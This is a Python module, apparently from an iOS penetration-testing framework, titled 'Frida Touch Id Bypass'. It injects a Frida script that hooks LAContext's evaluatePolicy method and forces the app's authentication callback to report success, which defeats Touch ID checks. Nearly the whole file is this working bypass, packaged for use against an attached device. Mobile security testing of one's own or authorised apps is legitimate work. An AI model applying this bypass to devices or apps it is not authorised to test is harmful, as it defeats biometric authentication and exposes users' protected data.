from core.framework.module import FridaScript


class Module(FridaScript):
    meta = {
        'name': 'Frida Touch Id Bypass',
        'author': 'Henry Hoggard',
        'description': 'Bypasses Touch Id authentication using frida instead. Can be used on devices that do not support cycript.',
        'options': (
            ('output', True, False, 'Full path of the output file'),
        ),
    }

    JS = '''\
if(ObjC.available) {
    var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            send("Hooking Touch Id..")
            var block = new ObjC.Block(args[4]);
            const appCallback = block.implementation;
            block.implementation = function (error, value)  {
                const result = appCallback(1, null);
                return result;
            };
        },
    });
} else {
    console.log("Objective-C Runtime is not available!");
}
'''

    # ==================================================================================================================
    # UTILS
    # ==================================================================================================================
    def __init__(self, params):
        FridaScript.__init__(self, params)
        # Setting default output file
        self.options['output'] = self.local_op.build_output_path_for_file("frida_touch_id_bypass.txt", self)

    # ==================================================================================================================
    # RUN
    # ==================================================================================================================
    def module_run(self):
        # Run the payload
        try:
            self.printer.info("Parsing payload")
            hook = self.JS
            script = self.session.create_script(hook)
            script.on('message', self.on_message)
            script.load()
        except Exception as e:
            self.printer.warning("Script terminated abruptly")
            self.printer.warning(e)

    def module_post(self):
        self.print_cmd_output()
